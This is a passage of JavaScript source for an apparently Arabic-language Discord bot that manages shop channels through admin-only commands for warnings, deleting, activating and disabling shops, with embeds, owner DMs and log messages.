        if (memberSeller && selectedType.role) {
          await memberSeller.roles.add(selectedType.role);
        }

        // إرسال رسالة خاصة للبائع مع تفاصيل المتجر
        try {
          await sellerUser.send({
            content: `**تـــم انــشــاء مــتــجــرك: <#${channel.id}>**`,
            embeds: [embedShop],
          });
        } catch (error) {
          console.error('Cannot send DM to user:', error);
        }

        // تسجيل الحدث في لوقز
        if (setupData.logs) {
          const logChannel = await client.channels.fetch(setupData.logs);
          if (logChannel) {
            const embedLog = new EmbedBuilder()
              .setTitle("تــم انــشــاء مــتــجــر")
              .addFields(
                { name: "بـواسـطـة:", value: `<@${message.author.id}>`, inline: true },
                { name: "مــتــجــر:", value: `<#${channel.id}>`, inline: true },
                { name: "نــوع الــمـتـجـر:", value: `${roleName}`, inline: true }
              )
              .setTimestamp();

            await logChannel.send({ embeds: [embedLog] });
          }
        }
      });

      nameCollector.on('end', collected => {
        if (collected.size === 0) {
          interaction.followUp({
            content: "**❌ انــتــهــى الــوقــت الــمــحــدّد لــادخــال الاســم**",
            ephemeral: true
          });
        }
      });

      await interaction.deferUpdate();
    }
  });

  collector.on('end', collected => {
    if (collected.size === 0) {
      typeMessage.edit({
        content: "**❌ انــتــهــى الــوقــت الــمــحــدّد لــلــاخــتــيــار**",
        components: []
      }).catch(() => {});
    }
  });
});

// الأمر: تحذير (warn)
client.on("messageCreate", async (message) => {
  if (message.author.bot) return;
  if (!message.guild) return;

  // جلب بيانات البريفيكس
  const prefixData = await Prefix.findOne({ guildId: message.guild.id }) || {};
  const warnWords = prefixData.warnShop ? prefixData.warnShop.split(",") : [];

  // التحقق إذا الكلمة المكتوبة تطابق الأمر بدقة
  const userInput = message.content.toLowerCase().trim();
  
  // تحقق دقيق من الأمر (يجب أن يكون مطابقاً تماماً أو يبدأ بالضبط بالكلمة)
  const isWarnCommand = 
    userInput === "+تحذير" || // مطابقة تامة
    warnWords.some((word) => {
      const lowerWord = word.toLowerCase().trim();
      return userInput === lowerWord || userInput.startsWith(lowerWord + " ");
    });

  // منع التداخل مع أمر التحذيرات
  if (userInput.startsWith("+تحذيرات")) return;


  if (!isWarnCommand) return;

  // جلب إعدادات السيرفر
  const setupData = await Setup.findOne({ guildId: message.guild.id });
  if (!setupData || !setupData.shopAdmin) {
    const reply = await message.reply({
      content: `**الــرجــاء تــحــديــد مــســؤول مــتــاجــر مــن امــر \n/setup**`,
    });
    setTimeout(() => {
      reply.delete().catch(() => {});
      message.delete().catch(() => {});
    }, 10000);
    return;
  }

  // تحقق من صلاحيات المسؤول
  if (!message.member.roles.cache.has(setupData.shopAdmin)) {
    const reply = await message.reply({
      content: `**لـيـس لـديـك صـلاحـيــة لإسـتـخـدام هــذا الأمـر تـحـتـاج رتـبـه <@&${setupData.shopAdmin}>**`,
    });
    setTimeout(() => {
      reply.delete().catch(() => {});
      message.delete().catch(() => {});
    }, 10000);
    return;
  }

  // تقسيم المحتوى للحصول على البيانات
  const args = message.content.split(" ");
  
  // تحديد القناة (إذا تم ذكرها)
  let targetChannel = message.channel;
  let amount = 1;
  let reason = "لــم يــتــم تــحــديــد ســبــب";
  
  // البحث عن منشن القناة أو معرفها
  const channelMention = args.find(arg => arg.startsWith("<#") && arg.endsWith(">"));
  if (channelMention) {
    const channelId = channelMention.replace(/[<#>]/g, '');
    targetChannel = await message.guild.channels.fetch(channelId).catch(() => null);
  }
  
  // البحث عن العدد
  const amountIndex = args.findIndex(arg => !isNaN(arg) && parseInt(arg) > 0);
  if (amountIndex !== -1) {
    amount = parseInt(args[amountIndex]);
  }
  
  // البحث عن السبب (كل الكلمات بعد العدد)
  if (amountIndex !== -1 && args.length > amountIndex + 1) {
    reason = args.slice(amountIndex + 1).join(" ");
  } else if (args.length > 1) {
    // إذا لم يتم تحديد عدد، فالسبب هو كل الكلمات بعد الأمر
    reason = args.slice(1).join(" ");
  }

  // التحقق من أن القناة هي متجر
  const shopData = await Shop.findOne({ 
    guildId: message.guild.id, 
    channelId: targetChannel.id 
  });

  if (!shopData) {
    const reply = await message.reply({
      content: "**هــذه الــروم لــيــســت مــتــجــر كــيــف بــتــحــذرهــا**",
    });
    setTimeout(() => {
      reply.delete().catch(() => {});
      message.delete().catch(() => {});
    }, 10000);
    return;
  }

  // تحديث عدد التحذيرات
  const newWarns = shopData.warns + amount;
  await Shop.updateOne(
    { guildId: message.guild.id, channelId: targetChannel.id },
    { $set: { warns: newWarns } }
  );

  // حساب التحذيرات المتبقية
  const remainingWarns = shopData.maxWarns - newWarns;

  let emb = new EmbedBuilder()
    .setTitle("تــم تــحــذيــر الــمــتــجــر")
    .addFields([
      {
        name: "**الــمــتــجــر :**",
        value: `<#${targetChannel.id}>`,
        inline: true,
      },
      {
        name: "**ســبـــب الـــتـــحـــذيـــر :**",
        value: `**${reason}**`,
        inline: true,
      },
      {
        name: "**عــدد تـحـذيـرات :**",
        value: `**${amount}**`,
        inline: true,
      },
      {
        name: "**عــدد تــحــذيـرات الــمـتــجــر :**",
        value: `**${newWarns}**`,
        inline: true,
      },
      {
        name: "**الــتــحـذيــرات الــمــتــبــقــيــة :**",
        value: `**${remainingWarns > 0 ? remainingWarns : 'تــم الــوصــول للــحــد الأقــصــى'}**`,
        inline: true,
      },
      {
        name: "**الــوقــت :**",
        value: `**<t:${Math.floor(Date.now() / 1000)}:R>**`,
        inline: true,
      },
    ])
    .setFooter({ 
      text: "Dev By Hox Devs", 
      iconURL: message.guild.iconURL() 
    });

  const button = new ButtonBuilder()
    .setCustomId(`remove_warnings`)
    .setLabel("لـــ ازالــة الــتــحــذيــر")
    .setEmoji("<a:005:1326822412607684618>")
    .setStyle(ButtonStyle.Secondary);

  const row = new ActionRowBuilder().addComponents(button);

  // إرسال الرد
  await message.reply({
    content: `**تــم تــحــذيــر الــمــتــجــر <#${targetChannel.id}> بــنــجــاح**`
  });

  // إرسال إشعار في قناة المتجر
  await targetChannel.send({
    content: `<@${shopData.ownerId}>`,
    embeds: [emb],
    components: [row],
  });

  if (setupData.line) {
    targetChannel.send({
      files: [setupData.line]
    });
  }

  // إرسال إشعار لصاحب المتجر
  try {
    const owner = await client.users.fetch(shopData.ownerId);
    await owner.send({
      content: `**تــم تــحــذيــر مــتــجــرك <#${targetChannel.id}>**`,
      embeds: [emb],
    });
  } catch (err) {
    console.log("فشل في إرسال رسالة خاصة لصاحب المتجر");
  }

  // تسجيل الحدث في سجلات السيرفر إذا كانت موجودة
  if (setupData.logs) {
    const logChannel = await client.channels.fetch(setupData.logs);
    if (logChannel) {
      const logEmbed = new EmbedBuilder()
        .setTitle("لــوق الــتــحــــذيــر")
        .addFields(
          { name: "الــمــتــجــر", value: `<#${targetChannel.id}>`, inline: true },
          { name: "الــمــســؤؤل", value: `<@${message.author.id}>`, inline: true },
          { name: "عــدد تــحــذيــرات الــمــتــجــر", value: `${newWarns}`, inline: true },
          { name: "الــســبــب", value: reason, inline: false }
        )
        .setTimestamp();

      await logChannel.send({ embeds: [logEmbed] });
    }
  }
});

// الأمر: إزالة تحذير (unwarn)
client.on("messageCreate", async (message) => {
  if (message.author.bot) return;
  if (!message.guild) return;

  // جلب بيانات البريفيكس
  const prefixData = await Prefix.findOne({ guildId: message.guild.id }) || {};
  const unwarnWords = prefixData.unwarnShop ? prefixData.unwarnShop.split(",") : [];

  // التحقق إذا الكلمة المكتوبة تطابق الأمر
  const userInput = message.content.toLowerCase().trim();
  const isUnwarnCommand = 
    userInput.startsWith("+ازالة") || // دي ثابتة
    unwarnWords.some((word) => userInput.startsWith(word.toLowerCase().trim()));

  if (!isUnwarnCommand) return;

  // جلب إعدادات السيرفر
  const setupData = await Setup.findOne({ guildId: message.guild.id });
  if (!setupData || !setupData.shopAdmin) {
    const reply = await message.reply({
      content: `**الــرجــاء تــحــديــد مــســؤول مــتــاجــر مــن امــر \n/setup**`,
    });
    setTimeout(() => {
      reply.delete().catch(() => {});
      message.delete().catch(() => {});
    }, 10000);
    return;
  }

  // تحقق من صلاحيات المسؤول
  if (!message.member.roles.cache.has(setupData.shopAdmin)) {
    const reply = await message.reply({
      content: `**لـيـس لـديـك صـلاحـيــة لإسـتـخـدام هــذا الأمـر تـحـتـاج رتـبـه <@&${setupData.shopAdmin}>**`,
    });
    setTimeout(() => {
      reply.delete().catch(() => {});
      message.delete().catch(() => {});
    }, 10000);
    return;
  }

  // تقسيم المحتوى للحصول على البيانات
  const args = message.content.split(" ");
  
  // تحديد القناة (إذا تم ذكرها)
  let targetChannel = message.channel;
  let amount = 1;
  let reason = "لــم يــتــم تــحــديــد ســبــب";
  
  // البحث عن منشن القناة أو معرفها
  const channelMention = args.find(arg => arg.startsWith("<#") && arg.endsWith(">"));
  if (channelMention) {
    const channelId = channelMention.replace(/[<#>]/g, '');
    targetChannel = await message.guild.channels.fetch(channelId).catch(() => null);
  }
  
  // البحث عن العدد
  const amountIndex = args.findIndex(arg => !isNaN(arg) && parseInt(arg) > 0);
  if (amountIndex !== -1) {
    amount = parseInt(args[amountIndex]);
  }
  
  // البحث عن السبب (كل الكلمات بعد العدد)
  if (amountIndex !== -1 && args.length > amountIndex + 1) {
    reason = args.slice(amountIndex + 1).join(" ");
  } else if (args.length > 1) {
    // إذا لم يتم تحديد عدد، فالسبب هو كل الكلمات بعد الأمر
    reason = args.slice(1).join(" ");
  }

  // التحقق من أن القناة هي متجر
  const shopData = await Shop.findOne({ 
    guildId: message.guild.id, 
    channelId: targetChannel.id 
  });

  if (!shopData) {
    const reply = await message.reply({
      content: "**هــذه الــروم لــيــســت مــتــجــر كــيــف بــتــحــذرهــا**",
    });
    setTimeout(() => {
      reply.delete().catch(() => {});
      message.delete().catch(() => {});
    }, 10000);
    return;
  }

  if (amount > shopData.warns) {
    const reply = await message.reply({
      content: `**كــيــف تــســتــهــبــل ؟ 🤨  \nالــمــتــجــر عــلــيــه ${shopData.warns} تــحــذيــر فــقــط ، وانــت تــبــي تــشــيــل ${amount} ؟**`,
    });
    setTimeout(() => {
      reply.delete().catch(() => {});
      message.delete().catch(() => {});
    }, 10000);
    return;
  }

  // تحديث عدد التحذيرات (طرح بدل الجمع)
  const newWarns = Math.max(0, shopData.warns - amount);
  await Shop.updateOne(
    { guildId: message.guild.id, channelId: targetChannel.id },
    { $set: { warns: newWarns } }
  );

  // حساب التحذيرات المتبقية
  const remainingWarns = shopData.maxWarns - newWarns;

  let emb = new EmbedBuilder()
    .setTitle("تــم إزالــة تــحــذيــر مــن الــمــتــجــر")
    .addFields([
      {
        name: "**الــمــتــجــر :**",
        value: `<#${targetChannel.id}>`,
        inline: true,
      },
      {
        name: "**ســبـــب الإزالــة :**",
        value: `**${reason}**`,
        inline: true,
      },
      {
        name: "**عــدد تـحـذيـرات الـمـزالـة :**",
        value: `**${amount}**`,
        inline: true,
      },
      {
        name: "**عــدد تــحــذيـرات الــمـتــجــر الــحــالي :**",
        value: `**${newWarns}**`,
        inline: true,
      },
      {
        name: "**الــتــحـذيــرات الــمــتــبــقــيــة :**",
        value: `**${remainingWarns}**`,
        inline: true,
      },
      {
        name: "**الــوقــت :**",
        value: `**<t:${Math.floor(Date.now() / 1000)}:R>**`,
        inline: true,
      },
    ])
    .setFooter({ 
      text: "Dev By Hox Devs", 
      iconURL: message.guild.iconURL() 
    });

  // إرسال الرد
  await message.reply({
    content: `**تــم إزالــة تــحــذيــر مــن الــمــتــجــر <#${targetChannel.id}> بــنــجــاح**`
  });

  // إرسال إشعار في قناة المتجر
  await targetChannel.send({
    content: `<@${shopData.ownerId}>`,
    embeds: [emb]
  });

  if (setupData.line) {
    targetChannel.send({
      files: [setupData.line]
    });
  }

  // إرسال إشعار لصاحب المتجر
  try {
    const owner = await client.users.fetch(shopData.ownerId);
    await owner.send({
      content: `**تــم إزالــة تــحــذيــر مــن مــتــجــرك <#${targetChannel.id}>**`,
      embeds: [emb],
    });
  } catch (err) {
    console.log("فشل في إرسال رسالة خاصة لصاحب المتجر");
  }

  // تسجيل الحدث في سجلات السيرفر إذا كانت موجودة
  if (setupData.logs) {
    const logChannel = await client.channels.fetch(setupData.logs);
    if (logChannel) {
      const logEmbed = new EmbedBuilder()
        .setTitle("لــوق إزالــة تــحــذيــر")
        .addFields(
          { name: "الــمــتــجــر", value: `<#${targetChannel.id}>`, inline: true },
          { name: "الــمــســؤؤل", value: `<@${message.author.id}>`, inline: true },
          { name: "عــدد تــحــذيــرات الــمــتــجــر", value: `${newWarns}`, inline: true },
          { name: "الــســبــب", value: reason, inline: false }
        )
        .setTimestamp();

      await logChannel.send({ embeds: [logEmbed] });
    }
  }
});

// الأمر: تحذيرات (warns)
client.on("messageCreate", async (message) => {
  if (message.author.bot) return;
  if (!message.guild) return;

  // جلب بيانات البريفيكس
  const prefixData = await Prefix.findOne({ guildId: message.guild.id }) || {};
  const warnsWords = prefixData.warnsShop ? prefixData.warnsShop.split(",") : [];

  // التحقق إذا الكلمة المكتوبة تطابق الأمر
  const userInput = message.content.toLowerCase().trim();
  const isWarnsCommand = 
    userInput.startsWith("+تحذيرات") || // دي ثابتة
    warnsWords.some((word) => userInput.startsWith(word.toLowerCase().trim()));

  if (!isWarnsCommand) return;

  // جلب إعدادات السيرفر
  const setupData = await Setup.findOne({ guildId: message.guild.id });
  if (!setupData || !setupData.shopAdmin) {
    const reply = await message.reply({
      content: `**الــرجــاء تــحــديــد مــســؤول مــتــاجــر مــن امــر \n/setup**`,
    });
    setTimeout(() => {
      reply.delete().catch(() => {});
      message.delete().catch(() => {});
    }, 10000);
    return;
  }

  // تقسيم المحتوى للحصول على البيانات
  const args = message.content.split(" ");
  
  // تحديد القناة (إذا تم ذكرها)
  let targetChannel = message.channel;
  
  // البحث عن منشن القناة أو معرفها
  const channelMention = args.find(arg => arg.startsWith("<#") && arg.endsWith(">"));
  if (channelMention) {
    const channelId = channelMention.replace(/[<#>]/g, '');
    targetChannel = await message.guild.channels.fetch(channelId).catch(() => null);
  }

  // التحقق من أن القناة هي متجر
  const shopData = await Shop.findOne({ 
    guildId: message.guild.id, 
    channelId: targetChannel.id 
  });

  if (!shopData) {
    const reply = await message.reply({
      content: "**هــذه الــروم لــيــســت مــتــجــر**",
    });
    setTimeout(() => {
      reply.delete().catch(() => {});
      message.delete().catch(() => {});
    }, 10000);
    return;
  }

  // التحقق من صلاحية المستخدم (صاحب متجر أو بارتنر أو مسؤول المتاجر)
  const isShopOwner = shopData.ownerId === message.author.id;
  const isPartner = shopData.partners.includes(message.author.id);
  const isShopAdmin = message.member.roles.cache.has(setupData.shopAdmin);

  if (!isShopOwner && !isPartner && !isShopAdmin) {
    const reply = await message.reply({
      content: `**ايــش دخــلــك بــتــحــذيــرات الــمــتــاجــر ؟ 😏  \n يــلا دزهـا 🏃‍♂️**`,
    });
    setTimeout(() => {
      reply.delete().catch(() => {});
      message.delete().catch(() => {});
    }, 10000);
    return;
  }

  // حساب التحذيرات المتبقية
  const remainingWarns = shopData.maxWarns - shopData.warns;

  let emb = new EmbedBuilder()
    .setTitle("تــحــذيــرات الــمــتــجــر")
    .addFields([
      {
        name: "**الــمــتــجــر **",
        value: `<#${targetChannel.id}>`,
        inline: true,
      },
      {
        name: "**عــدد تــحــذيــرات الــمــتــجــر**",
        value: `**${shopData.warns}**`,
        inline: true,
      },
      {
        name: "**الــتــحـذيــرات الــمــتــبــقــيــة**",
        value: `**${remainingWarns > 0 ? remainingWarns : 'تــم الــوصــول للــحــد الأقــصــى'}**`,
        inline: true,
      },
    ])
    .setFooter({ 
      text: "Dev By Hox Devs", 
      iconURL: message.guild.iconURL() 
    })
    .setImage(setupData.line || null)
    .setTimestamp();

  // إرسال الرد
  await message.reply({
    embeds: [emb]
  });
});
client.on("messageCreate", async (message) => {
  if (message.author.bot) return;
  if (!message.guild) return;

  // جلب بيانات البريفيكس
  const prefixData = await Prefix.findOne({ guildId: message.guild.id }) || {};
  const deleteWords = prefixData.deleteShop ? prefixData.deleteShop.split(",") : [];

  // التحقق إذا الكلمة المكتوبة تطابق الأمر
  const userInput = message.content.toLowerCase().trim();
  const isDeleteCommand = 
    userInput.startsWith("+حذف") || // دي ثابتة
    deleteWords.some((word) => userInput.startsWith(word.toLowerCase().trim()));

  if (!isDeleteCommand) return;

  // جلب إعدادات السيرفر
  const setupData = await Setup.findOne({ guildId: message.guild.id });
  if (!setupData || !setupData.shopAdmin) {
    const reply = await message.reply({
      content: `**الــرجــاء تــحــديــد مــســؤول مــتــاجــر مــن امــر \n/setup**`,
    });
    setTimeout(() => {
      reply.delete().catch(() => {});
      message.delete().catch(() => {});
    }, 10000);
    return;
  }

  // تحقق من صلاحيات المسؤول
  if (!message.member.roles.cache.has(setupData.shopAdmin)) {
    const reply = await message.reply({
      content: `**لـيـس لـديـك صـلاحـيــة لإسـتـخـدام هــذا الأمـر تـحـتـاج رتـبـه <@&${setupData.shopAdmin}>**`,
    });
    setTimeout(() => {
      reply.delete().catch(() => {});
      message.delete().catch(() => {});
    }, 10000);
    return;
  }

  // تقسيم المحتوى للحصول على البيانات
  const args = message.content.split(" ");
  
  // تحديد القناة (إذا تم ذكرها)
  let targetChannel = message.channel;
  let reason = "لــم يــتــم تــحــديــد ســبــب";
  
  // البحث عن منشن القناة أو معرفها
  const channelMention = args.find(arg => arg.startsWith("<#") && arg.endsWith(">"));
  if (channelMention) {
    const channelId = channelMention.replace(/[<#>]/g, '');
    targetChannel = await message.guild.channels.fetch(channelId).catch(() => null);
  }
  
  // البحث عن السبب (كل الكلمات بعد الأمر أو بعد المنشن)
  const startIndex = channelMention ? args.indexOf(channelMention) + 1 : 1;
  if (args.length > startIndex) {
    reason = args.slice(startIndex).join(" ");
  }

  // التحقق من أن القناة هي متجر
  const shopData = await Shop.findOne({ 
    guildId: message.guild.id, 
    channelId: targetChannel.id 
  });

  if (!shopData) {
    const reply = await message.reply({
      content: "**هــذه الــروم لــيــســت مــتــجــر**",
    });
    setTimeout(() => {
      reply.delete().catch(() => {});
      message.delete().catch(() => {});
    }, 10000);
    return;
  }

  await Shop.deleteOne({ guildId: message.guild.id, channelId: targetChannel.id });

  const embed = new EmbedBuilder()
    .setTitle("تــم حــذف الــمــتــجــر")
    .addFields(
      { name: "الــمــتــجــر", value: `> <#${targetChannel.id}>`, inline: true },
      { name: "الــســبــب", value: `> ${reason}`, inline: true },
      { name: "الــوقــت", value: `> <t:${Math.floor(Date.now() / 1000)}:R>`, inline: true }
    )
    .setColor("Red")
    .setFooter({ text: "Dev By Hox Devs", iconURL: message.guild.iconURL({ dynamic: true }) });

  // التحقق من وجود مرفقات (صور)
  if (message.attachments.size > 0) {
    const firstAttachment = message.attachments.first();
    if (firstAttachment.contentType && firstAttachment.contentType.startsWith('image/')) {
      embed.setImage(firstAttachment.url);
    }
  }

  await message.reply({
    content: `** تــم حــذف الــمــتــجــر <#${targetChannel.id}> بــنــجــاح **`
  });

  try {
    const owner = await client.users.fetch(shopData.ownerId);
    await owner.send({
      content: `** تــم حــذف مــتــجــرك <#${targetChannel.id}> **`,
      embeds: [embed],
    });
  } catch (err) {
    console.log("فشل إرسال رسالة لصاحب المتجر");
  }

  if (setupData.logs) {
    const logChannel = await client.channels.fetch(setupData.logs);
    if (logChannel) {
      const logEmbed = EmbedBuilder.from(embed)
        .setTitle("لــوق حــذف مــتــجــر")
        .addFields(
          { name: "الــمــســؤؤل", value: `> <@${message.author.id}>`, inline: true }
        );

      await logChannel.send({ embeds: [logEmbed] });
    }
  }

  try {
    await targetChannel.delete(`حذف المتجر - السبب: ${reason}`);
  } catch (err) {
    console.log("تعذر حذف القناة:", err);
  }
});

// events/messageCreate.js (لأمر التفاعلي)
client.on("messageCreate", async (message) => {
  if (message.author.bot) return;
  if (!message.guild) return;

  // جلب بيانات البريفيكس
  const prefixData = await Prefix.findOne({ guildId: message.guild.id }) || {};
  const activeWords = prefixData.activeShop ? prefixData.activeShop.split(",") : [];

  // التحقق إذا الكلمة المكتوبة تطابق الأمر
  const userInput = message.content.toLowerCase().trim();
  const isActiveCommand = 
    userInput.startsWith("+تفعيل") || // دي ثابتة
    activeWords.some((word) => userInput.startsWith(word.toLowerCase().trim()));

  if (!isActiveCommand) return;

  // جلب إعدادات السيرفر
  const setupData = await Setup.findOne({ guildId: message.guild.id });
  if (!setupData || !setupData.shopAdmin) {
    const reply = await message.reply({
      content: `**الــرجــاء تــحــديــد مــســؤول مــتــاجــر مــن امــر \n/setup**`,
    });
    setTimeout(() => {
      reply.delete().catch(() => {});
      message.delete().catch(() => {});
    }, 10000);
    return;
  }

  // تحقق من صلاحيات المسؤول
  if (!message.member.roles.cache.has(setupData.shopAdmin)) {
    const reply = await message.reply({
      content: `**لـيـس لـديـك صـلاحـيــة لإسـتـخـدام هــذا الأمـر تـحـتـاج رتـبـه <@&${setupData.shopAdmin}>**`,
    });
    setTimeout(() => {
      reply.delete().catch(() => {});
      message.delete().catch(() => {});
    }, 10000);
    return;
  }

  // تقسيم المحتوى للحصول على البيانات
  const args = message.content.split(" ");
  
  // تحديد القناة (إذا تم ذكرها)
  let targetChannel = message.channel;
  let reason = "لــم يــتــم تــحــديــد ســبــب";
  
  // البحث عن منشن القناة أو معرفها
  const channelMention = args.find(arg => arg.startsWith("<#") && arg.endsWith(">"));
  if (channelMention) {
    const channelId = channelMention.replace(/[<#>]/g, '');
    targetChannel = await message.guild.channels.fetch(channelId).catch(() => null);
  }
  
  // البحث عن السبب (كل الكلمات بعد الأمر أو بعد المنشن)
  const startIndex = channelMention ? args.indexOf(channelMention) + 1 : 1;
  if (args.length > startIndex) {
    reason = args.slice(startIndex).join(" ");
  }

  // التحقق من أن القناة هي متجر
  const shopData = await Shop.findOne({
    guildId: message.guild.id,
    channelId: targetChannel.id
  });

  if (!shopData) {
    const reply = await message.reply({
      content: "**هـذة الـروم لـيـسـت مـتـجـراً**",
    });
    setTimeout(() => {
      reply.delete().catch(() => {});
      message.delete().catch(() => {});
    }, 10000);
    return;
  }

  if (shopData.status === "1") {
    const reply = await message.reply({
      content: "**الــمــتــجــر مــتــفــعــل اصــلا \nانــت شــارب حــاجــة؟**",
    });
    setTimeout(() => {
      reply.delete().catch(() => {});
      message.delete().catch(() => {});
    }, 10000);
    return;
  }
  
  // تفعيل رؤية القناة للجميع
  await targetChannel.permissionOverwrites.edit(message.guild.id, { ViewChannel: true });

  // إنشاء إيمبد للتفعيل
  const embed = new EmbedBuilder()
    .setTitle("تــم تـفـعـيـل الـمـتـجـر")
    .addFields(
      { name: "الــمــتــجــر", value: `> <#${targetChannel.id}>`, inline: true },
      { name: "الــســبــب", value: `> ${reason}`, inline: true },
      { name: "الــوقــت", value: `> <t:${Math.floor(Date.now() / 1000)}:R>`, inline: true },
      { name: "حــالــة الــضــريــبــة", value: `> ✅ تــم دفــع الــضــريــبــة`, inline: true }
    )
    .setImage(setupData.line || null)
    .setFooter({ 
      text: "Dev By Hox Devs", 
      iconURL: message.guild.iconURL({ dynamic: true }) 
    });

  await message.reply({
    content: `**تــم تـفـعـيـل الـمـتـجـر <#${targetChannel.id}> بــنــجــاح\nو تــم دفــع الــضــريــبــة**`
  });

  // إرسال إشعار لمالك المتجر
  try {
    const owner = await client.users.fetch(shopData.ownerId);
    await owner.send({
      content: `**تــم تـفـعـيـل مــتــجــرك <#${targetChannel.id}>**`,
      embeds: [embed],
    });
  } catch (err) {
    console.log("فشل إرسال رسالة لصاحب المتجر");
  }

  if (setupData.logs) {
    const logChannel = await client.channels.fetch(setupData.logs);
    if (logChannel) {
      const logEmbed = EmbedBuilder.from(embed)
        .setTitle("لــوق تـفـعـيـل مــتــجــر")
        .setImage(null)
        .addFields(
          { name: "الــمــســؤؤل", value: `> <@${message.author.id}>`, inline: true }
        );

      await logChannel.send({ embeds: [logEmbed] });
    }
  }

  // تحديث حالة المتجر وإعادة التحذيرات إلى 0 ودفع الضريبة
  await Shop.updateOne(
    { guildId: message.guild.id, channelId: targetChannel.id },
    { 
      $set: { 
        status: "1",
        warns: 0,  // إعادة التحذيرات إلى 0
        taxPaid: "yes", // دفع الضريبة
        lastTaxPayment: new Date() // تحديث تاريخ آخر دفع
      } 
    }
  );
});
// الأمر: تعطيل (disable)
client.on("messageCreate", async (message) => {
  if (message.author.bot) return;
  if (!message.guild) return;

  // جلب بيانات البريفيكس
  const prefixData = await Prefix.findOne({ guildId: message.guild.id }) || {};
  const disableWords = prefixData.disableShop ? prefixData.disableShop.split(",") : [];

  // التحقق إذا الكلمة المكتوبة تطابق الأمر
  const userInput = message.content.toLowerCase().trim();
  const isDisableCommand = 
    userInput.startsWith("+تعطيل") || // دي ثابتة
    disableWords.some((word) => userInput.startsWith(word.toLowerCase().trim()));

  if (!isDisableCommand) return;

  // جلب إعدادات السيرفر
  const setupData = await Setup.findOne({ guildId: message.guild.id });
  if (!setupData || !setupData.shopAdmin) {
    const reply = await message.reply({
      content: `**الــرجــاء تــحــديــد مــســؤول مــتــاجــر مــن امــر \n/setup**`,
    });
    setTimeout(() => {
      reply.delete().catch(() => {});
      message.delete().catch(() => {});
    }, 10000);
    return;
  }

  // تحقق من صلاحيات المسؤول
  if (!message.member.roles.cache.has(setupData.shopAdmin)) {
    const reply = await message.reply({
      content: `**لـيـس لـديـك صـلاحـيــة لإسـتـخـدام هــذا الأمـر تـحـتـاج رتـبـه <@&${setupData.shopAdmin}>**`,
    });
    setTimeout(() => {
      reply.delete().catch(() => {});
      message.delete().catch(() => {});
    }, 10000);
    return;
  }

  // تقسيم المحتوى للحصول على البيانات
  const args = message.content.split(" ");
  
  // تحديد القناة (إذا تم ذكرها)
  let targetChannel = message.channel;
  let reason = "لــم يــتــم تــحــديــد ســبــب";
  
  // البحث عن منشن القناة أو معرفها
  const channelMention = args.find(arg => arg.startsWith("<#") && arg.endsWith(">"));
  if (channelMention) {
    const channelId = channelMention.replace(/[<#>]/g, '');
    targetChannel = await message.guild.channels.fetch(channelId).catch(() => null);
  }
  
  // البحث عن السبب (كل الكلمات بعد الأمر أو بعد المنشن)
  const startIndex = channelMention ? args.indexOf(channelMention) + 1 : 1;
  if (args.length > startIndex) {
    reason = args.slice(startIndex).join(" ");
  }

  // التحقق من أن القناة هي متجر
  const shopData = await Shop.findOne({
    guildId: message.guild.id,
    channelId: targetChannel.id
  });

  if (!shopData) {
    const reply = await message.reply({
      content: "**هـذة الـروم لـيـسـت مـتـجـراً**",
    });
    setTimeout(() => {
      reply.delete().catch(() => {});
      message.delete().catch(() => {});
    }, 10000);
    return;
  }

  if (shopData.status == "0") {
    const reply = await message.reply({
      content: "**هـذا الـمـتـجـر مـعـطـل**",
    });
    setTimeout(() => {
      reply.delete().catch(() => {});
      message.delete().catch(() => {});
    }, 10000);
    return;
  }
  
  await targetChannel.permissionOverwrites.edit(message.guild.id, { ViewChannel: false });

  // إنشاء إيمبد للتعطيل
  const embed = new EmbedBuilder()
    .setTitle("تــم تـعـطـيـل الـمـتـجـر")
    .addFields(
      { name: "الــمــتــجــر", value: `> <#${targetChannel.id}>`, inline: true },
      { name: "الــســبــب", value: `> ${reason}`, inline: true },
      { name: "الــوقــت", value: `> <t:${Math.floor(Date.now() / 1000)}:R>`, inline: true }
    )
    .setImage(setupData.line || null)
    .setFooter({ 
      text: "Dev By Hox Devs", 
      iconURL: message.guild.iconURL({ dynamic: true }) 
    });

  // التحقق من وجود مرفقات (صور)
  if (message.attachments.size > 0) {
    const firstAttachment = message.attachments.first();
    if (firstAttachment.contentType && firstAttachment.contentType.startsWith('image/')) {
      embed.setImage(firstAttachment.url);
    }
  }

  await message.reply({
    content: `**تــم تـعـطـيـل الـمـتـجـر <#${targetChannel.id}> بــنــجــاح**`
  });

  // إرسال إشعار لمالك المتجر
  try {
    const owner = await client.users.fetch(shopData.ownerId);
    await owner.send({
      content: `**تــم تـعـطـيـل مــتــجــرك <#${targetChannel.id}>**`,
      embeds: [embed],
    });
  } catch (err) {
    console.log("فشل إرسال رسالة لصاحب المتجر");
  }

  // إرسال لوق في قناة اللوقات إذا تم تحديدها
  if (setupData.logs) {
    const logChannel = await client.channels.fetch(setupData.logs);
    if (logChannel) {
      const logEmbed = EmbedBuilder.from(embed)
        .setTitle("لــوق تـعـطـيـل مــتــجــر")
        .setImage(null)
        .addFields(
          { name: "الــمــســؤؤل", value: `> <@${message.author.id}>`, inline: true }
        );

      await logChannel.send({ embeds: [logEmbed] });
    }
  }

  await Shop.updateOne(
    { guildId: message.guild.id, channelId: targetChannel.id },
    { $set: { status: "0" } }
  );
});

client.on("messageCreate", async (message) => {
  if (message.author.bot) return;
  if (!message.guild) return;

  // جلب بيانات البريفيكس
  const prefixData = await Prefix.findOne({ guildId: message.guild.id }) || {};
  const changeTypeWords = prefixData.changeType ? prefixData.changeType.split(",") : [];

  // التحقق إذا الكلمة المكتوبة تطابق الأمر
  const userInput = message.content.toLowerCase().trim();
  const isChangeTypeCommand = 
    userInput.startsWith("+تغيير") || // دي ثابتة
    changeTypeWords.some((word) => userInput.startsWith(word.toLowerCase().trim()));

  if (!isChangeTypeCommand) return;

  // جلب إعدادات السيرفر
  const setupData = await Setup.findOne({ guildId: message.guild.id });
  if (!setupData || !setupData.shopAdmin) {
    const reply = await message.reply({
      content: `**الــرجــاء تــحــديــد مــســؤول مــتــاجــر مــن امــر \n/setup**`,
    });
    setTimeout(() => {
      reply.delete().catch(() => {});
      message.delete().catch(() => {});
    }, 10000);
    return;
  }

  // تحقق من صلاحيات المسؤول
  if (!message.member.roles.cache.has(setupData.shopAdmin)) {
    const reply = await message.reply({
      content: `**لـيـس لـديـك صـلاحـيــة لإسـتـخـدام هــذا الأمـر تـحـتـاج رتـبـه <@&${setupData.shopAdmin}>**`,
    });
    setTimeout(() => {
      reply.delete().catch(() => {});
      message.delete().catch(() => {});
    }, 10000);
    return;
  }

